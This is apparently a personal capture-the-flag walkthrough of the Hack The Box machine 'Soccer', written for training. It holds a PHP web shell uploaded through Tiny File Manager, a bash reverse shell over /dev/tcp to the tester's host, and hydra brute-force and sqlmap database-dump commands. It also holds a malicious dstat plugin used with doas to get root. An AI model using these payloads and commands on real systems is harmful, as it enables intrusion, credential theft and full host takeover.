Start: 2026-09-09, 14:40

IP:
```
10.129.56.3
```
---

ports

```
sudo nmap -p- -Pn -n -vv --min-rate=5000 10.129.56.3 -oG network/nmap_ports.txt
```

01

SSH, HTTP, xmltec-xmlmail

It seems xmltec-xmlmail is a legacy messaging system. https://portlookup.com/port-9091/

service

```
sudo nmap -p22,80,9091 -sCV 10.129.56.3 -oN network/nmap_service.txt
```

02

SSH version: OpenSSH 8.2p1
OS: Ubuntu Linux
HTTP server: nginx 1.18.0
Domain: soccer.htb
9091, failing HTTP requests? Talking to web server?

Adding IP -Domain to /etc/hosts

03

HTTP - Website

Browsing: http://soccer.htb/

04

Just a static page it seems

Technologies

```
whatweb http://soccer.htb
```

05

Bootstrap 4.1.1
JQuery 3.2.1,3.6.0
nginx 1.18.0

Fuzzing

```
ffuf -u http://soccer.htb/FUZZ -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

06

`tiny`

Browsing: http://soccer.htb/tiny/

07

"Tiny File Manager" login panel
(CCP Programmers at the button of the page)

Looking at the source code (Ctrl + U)

08

See tiny file manager repo https://tinyfilemanager.github.io/ and what it seems its version 2.4.3

Searching "tiny file manager 2.4.3" on internet

Exploits surface right away

09

Seems to be a path traversal with CVE-2021-45010

"A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project's Tiny File Manager <= 2.4.6 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server."
Source: https://github.com/febinrev/tinyfilemanager-2.4.3-exploit

**...attackers with valid user accounts**

This exploit requires a valid account for Tiny File Manager

Recursive fuzzing of `tiny` directory

```
feroxbuster -u http://soccer.htb/tiny/ -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt
```

Nothing

Fuzzing for php files (http://soccer.htb/tiny/tinyfilemanager.php)

```
ffuf -u http://soccer.htb/tiny/FUZZ.php -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt
```

Nothing

Fuzzing for diferent extensions with same file name

```
ffuf -u http://soccer.htb/tiny/tinyfilemanager.FUZZ -w /opt/wordlists/SecLists/Fuzzing/file-extensions-lower-case.txt
```

php, nothing

Righ click on the H3K icon can access a image. http://soccer.htb/d605120c-1650-4d94-aaff-f4d7c85f8337

Download it but is .htlm, page code...

Dont find any information on how to probe port 9091 massaging service.

Have error response on login 

10

`Login failed. Invalid username or password`

Have parameters

11

`fm_usr`
`fm_pwd`

Brute forcing login

```
hydra soccer.htb http-form-post "/tiny/tinyfilemanager.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid username or password" -L /opt/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -P /opt/wordlists/rockyou.txt -t 10 -w 30 -o hydra_tiny_form.txt
```

`283.00 tries/min` - `56h`...

Cancel

Trying to connect to 9091

```
telnet soccer.htb 9091
```

12

Checking vhost

```
ffuf -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.129.56.3 -H "Host: FUZZ.soccer.htb" -fc 301
```

Nothing

Searching for the discovered github link https://tinyfilemanager.github.io/

13

The README specifies default credentials
`admin:admin@123`
`user:12345`

Using admin

14

Logged in. Lets use the exploit: https://github.com/febinrev/tinyfilemanager-2.4.3-exploit

15

1. The script creates a HTTP request
2. Leakes the web root directory to use on next step

16

3. Adds various `../` for path traversal plus path from web root. Then creates the PHP file with malicious code for RCE and uploads it. Finally it seems to directly access the file uploaded to get a interactive shell for the user to type commands.

Download it:

```
wget https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/refs/heads/main/tiny_file_manager_exploit.py
```

Using it:

```
python3 tiny_file_manager_exploit.py http://soccer.htb/tiny/tinyfilemanager.php admin admin@123
```

17

Is not working for neither credentials

Trying manually

Creating `hello123.php` file with PHP payload

```
<?php system($_REQUEST['cmd']); ?>
```

Uploading it at http://soccer.htb/tiny/tinyfilemanager.php?p=&upload

18

Seems uploaded
Destination folder (web root): /var/www/html/

Trying to call it but getting errors

Trying with another script, this one bash: https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.sh

Download it:

```
wget https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.sh
```

Use it:

```
./exploit.sh http://soccer.htb/tiny/tinyfilemanager.php admin "admin@123"
```

`[-] File Upload Unsuccessful! Exiting!`

Trying manually again on `uploads/` directory

19

Clicking the Upload button. I missed that before

20

Browsing for the file and cmd whoami http://soccer.htb/tiny/uploads/hello123.php?cmd=whoami

21

Is working. RCE as `www-data`

Reverse shell

```
bash -c 'bash -i &> /dev/tcp/10.10.14.204/9001 0>&1'
```

URL encoded

```
bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.204/9001+0>%261'
```

http://soccer.htb/tiny/uploads/hello123.php?cmd=bash+-c+%27bash+-i+%26%3E+/dev/tcp/10.10.14.204/9001+0%3E%261%27

Got the shell

Context

```
whoami && ip a | grep inet
```

22

Connected as `www-data` at `soccer` host with IP: 10.129.56.3

Find `user.txt` flag at `/home/player/user.txt` but no permission to read it

---

Listing internal ports

```
ss -lntp
```

23

See ports 3000 (web?), 3306 and 33060 (mysql) on localhost / 127.0.0.1

```
curl http://localhost:3000
```

3000 seems to be the website already seen

```
which mysql
```

`/usr/bin/mysql`. Found binary for mysql queries, but access denied, and need password.

Reading `/etc/passwd`

```
cat /etc/passwd
```

At first glance nothing interesting for me.

Stopping to take a break. End: 2026-09-09,17:20

Start: 2026-09-09, 18:35

Hunting for credentials on `/etc/nginx/`  configuration files

Searching `modules-enabled/` ,`nginx.conf` find nothing

Checking `sites-enabled/`

Listing contents of `soc-player.htb` discover a possible subdomain running on same port 80

24

`soc-player.soccer.htb`

Adding to /etc/hosts

25

Browsing: http://soc-player.soccer.htb/

26

Seems to be the same page but have more options
`match` - Static page for matches, not interesting
`login` - Login
`signup` - Register

Register

27

Then login, redirected to `check`

28

See a ticket ID, it seems the field is to check/validate tickets

On burpsuite now see comunication to the 9091 port, it seems recieve the ticket ID specified in a simple JSON format and respond whether is valid or not

29

Viewing source code notice JS code inside `<script>` tags, and what looks like a variable getting the ID that user inputs, thinking reflected XSS but not sure.

---
Hint: https://0xdf.gitlab.io/2023/06/10/htb-soccer.html. `SQL Injection over Websockets`

It looks like the websocket communication is injectable, enabling to enumerate the SQL database.

---

Running automated SQL probing `sqlmap`

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
```
(command argument `--data` looked from hint/reference)

It identifies 2 injection types. Blind boolean-based and Blind time-based

Enumerating databases (`--dbs`)

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --dbs
```

32

I assume the `soccer_db` is the interesting one

Enumerating tables in `soccer_db` (`-D <db> --tables`)

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -D soccer_db --tables
```

33

Table `accounts`

Listing contents in table `accounts` in db `soccer_db` (`-T <table> --dump`)

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -D soccer_db -T accounts --dump
```

34

New credential set:
```User
player
```
```Password
PlayerOftheMatch2022
```

Connecting via SSH

```
ssh player@soccer.htb
```

Input password

Connected

Context

```
whoami && ip a | grep inet
```

35

Connected as player to target system `soccer` with IP: 10.129.56.3

Getting user flag:

```
cat /home/player/user.txt
```

36

user.txt: `414bf146c0a81cc0a8e6d710f79393ab`

---

Privilege Escalation

Enumerating sudo privileges

```
sudo -l
```

37

Cant run sudo at all

Need help. Will reference the same source as previous hint.
Referenced: https://0xdf.gitlab.io/2023/06/10/htb-soccer.html

Looking for SetUID binaries

```
find / -perm -4000 2>/dev/null
```

38

It seem `doas` is the interesting one, being an alternative for `sudo` ("typically found on OpenBSD operating systems, but that can be installed on Debian-base Linux OSes like Ubuntu.")

Getting doas config

```
find / -name doas.conf 2>/dev/null
```

39

List content

```
cat /usr/local/etc/doas.conf
```

40

Can execute `/usr/bin/dstat` as root

"
`dstat` is a tool for getting system information. Looking at the [man page](https://linux.die.net/man/1/dstat), there’s a section on plugins that says:

While **anyone can create their own dstat plugins** (and contribute them) dstat ships with a number of plugins already that extend its capabilities greatly.
"

"
Paths that may contain external `dstat_*.py` plugins:

```
~/.dstat/
(path of binary)/plugins/
/usr/share/dstat/
/usr/local/share/dstat/
```

Plugins are Python scripts with the name `dstat_[plugin name].py`.
"
Sources: Reference and https://linux.die.net/man/1/dstat

Creating malicious plugin to run with root executable script, which will spawn a shell (`/bin/bash`) as root.

```
import os

os.system("/bin/bash")
```

Can write `/usr/local/share/dstat`

```
nano /usr/local/share/dstat/dstat_theplug.py
```

41

Running it

```
doas /usr/bin/dstat --theplug
```

Executed. Shell as root spawned

Context

```
whoami && ip a | grep inet
```

42

Connected as root to the target system soccer with IP: 10.129.56.3

Capture root flag

```
cat /root/root.txt
```

43

root.txt: `da9fa9a824d7a76d1681bd7a460197dc`

End: 2026-09-09, 20:00

---
##### Post-testing

###### Time frame
Start: 2026-09-09, 14:40
End: 2026-09-09,17:20

Start: 2026-09-09, 18:35
End: 2026-09-09, 20:00

Total time testing: 4h 5min

###### Techniques
- Exploiting known File upload vulnerability on discovered technology `Tiny File Manager 2.4.3`
- Reading `nginx` server configuration files
- Enumerating and dumping SQL database with automated tool `sqlmap`. Due to time-based SQLi in JSON field `id` parameter. 
- Enumerating SetUID binaries
- Enumerating `doas` permissions (similar to `sudo`)
- Abusing `/usr/bin/dstat` (system info tool) execution permission as root by creating a malicious plugin spawning `/bin/bash`, shell as root.

###### Sources
- Info about service on 9091: https://portlookup.com/port-9091/
- Understand exploit (reused logic for manual exploitation): https://github.com/febinrev/tinyfilemanager-2.4.3-exploit
- Tiny File Manager docs: https://tinyfilemanager.github.io/
- `dstat` manual: https://linux.die.net/man/1/dstat
- Hint/Reference doc: https://0xdf.gitlab.io/2023/06/10/htb-soccer.html
